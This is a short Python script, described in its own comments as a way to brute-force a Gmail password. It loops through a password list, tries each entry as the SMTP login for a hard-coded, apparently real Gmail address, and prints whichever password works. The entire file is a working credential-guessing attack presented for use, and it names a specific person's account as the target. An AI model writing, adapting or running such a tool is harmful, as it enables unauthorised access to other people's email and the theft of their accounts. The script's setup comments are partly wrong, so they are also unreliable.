# how to bruteforce a gmail password
# at your google setting you have to enable Access through less secure apps
# install smtplib with pip install smtplib


import smtplib, time, sys


file = open("passwordlist.txt", "r+")     #open password list



for i in file:
    try:
        s = smtplib.SMTP("smtp.gmail.com: 587")
        s.ehlo()
        s.starttls()
        print(i)

        s.login("louisfrdrch@gmail.com", i)     #try to login several times with going trough every email in the list 
        control = s.noop()
        number = (control[0])
        if number == 250:
            print("Password:" + i)
            sys.exit()

        time.sleep(1)

    except smtplib.SMTPAuthenticationError:
        pass
